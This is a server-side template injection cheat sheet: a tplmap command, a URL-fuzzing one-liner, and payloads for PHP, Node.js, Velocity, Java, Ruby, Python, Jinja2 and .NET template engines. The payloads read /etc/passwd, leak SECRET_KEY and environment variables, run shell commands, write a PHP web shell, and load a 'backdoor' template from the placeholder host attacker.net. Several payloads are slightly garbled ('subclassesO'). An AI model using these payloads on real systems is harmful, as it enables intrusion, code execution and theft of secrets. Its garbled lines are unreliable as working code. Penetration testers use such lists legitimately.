# SSTI

```text
# Tool
# https://github.com/epinna/tplmap
tplmap.py -u 'http://www.target.com/page?name=John'

# Payloads
# https://github.com/payloadbox/ssti-payloads

# Oneliner
# Check SSTI in all param with qsreplace
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
# Check in burp for reponses with ssti81

# Generic
${{<%[%'"}}%\.
{% debug %}
{7*7}
{{ '7'*7 }}
{{ [] .class.base.subclassesO }}
{{''.class.mro()[l] .subclassesO}}
for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
{{ [].__class__.__base__.__subclasses__O }}

# PHP Based
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Node.js Backend based 
{{ this }}-> [Object Object]
{{ this.__proto__ }}-> [Object Object]
{{ this.__proto__.constructor.name }}-> Object
{{this.constructor.constructor}}
{{this. constructor. constructor('process.pid')()}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Java
${7*7}
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Ruby
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>

# Python
{% debug %}
{{settings.SECRET_KEY}}
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}

# Perl
<%= perl code %>
<% perl code %>

# Flask/Jinja2
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# .Net
@(1+2)
@{// C# code}
```

